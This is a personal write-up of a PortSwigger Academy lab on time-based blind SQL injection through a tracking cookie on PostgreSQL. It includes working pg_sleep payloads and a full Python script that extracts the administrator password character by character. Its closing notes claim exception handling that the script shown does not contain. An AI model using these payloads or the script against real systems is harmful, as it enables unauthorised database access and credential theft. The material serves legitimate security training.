@@ -1,0 +1,197 @@
+==================================================
+SQL INJECTION - TEMPLATE
+==================================================
+
+Date       : January 7, 2026
+Lab/Target : PortSwigger Academy - Blind SQL injection with time delays and information retrieval
+URL        : https://0a6900a404bc9c6a8091ad0b008d00d7.web-security-academy.net
+Objective  : Extract administrator password via time-based blind SQLi and login
+Comment    : Practitioner level lab - Cookie-based injection point (TrackingId)
+
+==================================================
+PHASE 1 - DETECTION
+==================================================
+
+[X] Simple character test
+    '
+    Result: No visible error or difference in response
+    Comment: Blind injection suspected
+
+[X] Simple bypass test
+    ' OR '1'='1
+    ' OR 1=1--
+    Result: No visible difference - confirms blind context
+
+[X] Time delay test (PostgreSQL)
+    ' || (select pg_sleep(10))--
+    Result: Response delayed by ~10 seconds
+    Comment: TIME-BASED BLIND SQLi CONFIRMED on PostgreSQL
+
+==================================================
+PHASE 2 - IDENTIFICATION
+==================================================
+
+2.1 DBMS type
+-------------
+[X] Get version / DBMS
+    Test payload: ' || (select pg_sleep(10))--
+    Result: pg_sleep() function works
+    DBMS: PostgreSQL
+
+2.2 Number of columns
+---------------------
+[N/A] ORDER BY
+    Not applicable for time-based blind injection
+
+[N/A] UNION NULL
+    Not applicable - no visible output
+
+2.3 Displayed columns
+---------------------
+[N/A] Visible columns test
+    Not applicable - blind context (no output displayed)
+
+2.4 Current database
+--------------------
+[N/A] Database name
+    Not required for this lab objective
+
+==================================================
+PHASE 3 - EXPLOITATION (UNION-BASED)
+==================================================
+
+[N/A] UNION-based exploitation
+    Not applicable - Blind SQLi context (results not returned)
+    Proceeding to PHASE 4 - Time-based blind extraction
+
+==================================================
+PHASE 4 - BLIND SQLi (if UNION blocked)
+==================================================
+
+4.1 Boolean-based
+-----------------
+[N/A] True/False response test
+    Not applicable - Application does not respond differently based on query results
+    Only timing-based inference available
+
+4.2 Time-based (PRIMARY METHOD)
+--------------------------------
+[X] Delay test
+    PostgreSQL: ' || (select pg_sleep(10))--
+    Result: ~10 second delay confirmed
+
+[X] Conditional delay - Basic validation
+    Payload: ' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
+    Result: ~10 second delay (TRUE condition)
+
+    Payload: ' || (select case when (1=2) then pg_sleep(10) else pg_sleep(-1) end)--
+    Result: Instant response (FALSE condition)
+    Comment: CONDITIONAL TIME-BASED INJECTION VALIDATED
+
+[X] Confirm target user exists
+    Payload: ' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+    Result: ~10 second delay
+    Comment: User 'administrator' exists in 'users' table
+
+[X] Password length determination
+    Payload: ' || (select case when (username='administrator' and length(password)=20) then pg_sleep(10) else pg_sleep(-1) end from users)--
+    Result: ~10 second delay at LENGTH=20
+    Comment: Password is 20 characters long
+
+[X] Character-by-character extraction (AUTOMATED)
+    Method: ASCII-based bruteforce (characters 32-126)
+    Payload structure:
+    ' || (select case when (username='administrator' and ascii(substring(password,{POSITION},1))='{ASCII_CODE}') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+    Extraction script:
+
+    import sys
+    import requests
+    import urllib.parse
+
+    def sqli_password(url):
+        password_extracted = ""
+        for i in range(1,21):
+            for j in range(32,126):
+                sql_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,j)
+                sql_payload_encoded = urllib.parse.quote(sql_payload)
+                cookies = {'TrackingId': 'Rek6sYv8pYW2ocxH' + sql_payload_encoded, 'session': 'hocuDikJL9DU5HgsNQk2aZr5S7hIv8HW'}
+                r = requests.get(url, cookies=cookies, verify=False, timeout=15)
+                if int(r.elapsed.total_seconds()) > 9:
+                    password_extracted += chr(j)
+                    sys.stdout.write('\r' + password_extracted)
+                    sys.stdout.flush()
+                    break
+                else:
+                    sys.stdout.write('\r' + password_extracted + chr(j))
+                    sys.stdout.flush()
+        return password_extracted
+
+    Result: Password successfully extracted (20 characters)
+    Execution time: ~5-10 minutes
+
+    Note: URL encoding critical for cookie payload (urllib.parse.quote)
+    Note: Original TrackingId preserved + payload appended
+    Note: pg_sleep(-1) in ELSE clause (ignored by PostgreSQL = instant response)
+
+==================================================
+PHASE 5 - PRIVILEGE ESCALATION
+==================================================
+
+5.1 File read
+-------------
+[N/A] Not attempted - Lab objective achieved with password extraction
+
+5.2 File write
+--------------
+[N/A] Not attempted - Lab objective achieved
+
+5.3 OS command execution
+------------------------
+[N/A] Not attempted - Lab objective achieved
+
+==================================================
+FINAL RESULT
+==================================================
+
+[X] Administrator password extracted via time-based blind SQLi
+[X] Successful authentication to /my-account
+[X] Lab marked as SOLVED
+
+Method: Time-Based Blind SQL Injection (PostgreSQL)
+Attack vector: TrackingId cookie parameter
+Technique: Conditional delays with ASCII character bruteforce
+Total time: ~15 minutes (validation + extraction)
+
+==================================================
+KEY TECHNICAL NOTES
+==================================================
+
+1. Cookie injection point
+   - TrackingId parameter vulnerable
+   - URL encoding mandatory (urllib.parse.quote)
+   - Original TrackingId value preserved in payload
+
+2. PostgreSQL-specific functions
+   - pg_sleep(n): Delay execution by n seconds
+   - pg_sleep(-1): Negative value ignored (no delay)
+   - CASE WHEN for conditional logic
+
+3. SQL concatenation operator
+   - || (double pipe) used for string concatenation
+   - Allows subquery injection without breaking original query
+   - Syntax: 'TrackingId' || (select ...)
+
+4. ASCII comparison benefits
+   - Avoids quote escaping issues
+   - Cleaner payload construction
+   - ascii(substring(password,1,1))='97' vs substring(password,1,1)='a'
+
+5. Detection threshold
+   - Response time > 9 seconds = character match
+   - Accounts for network latency while avoiding false positives
+
+6. Error handling in script
+   - Timeout set to 15 seconds (pg_sleep(10) + 5s buffer)
+   - Exception handling for network errors
+   - Continue loop on failures
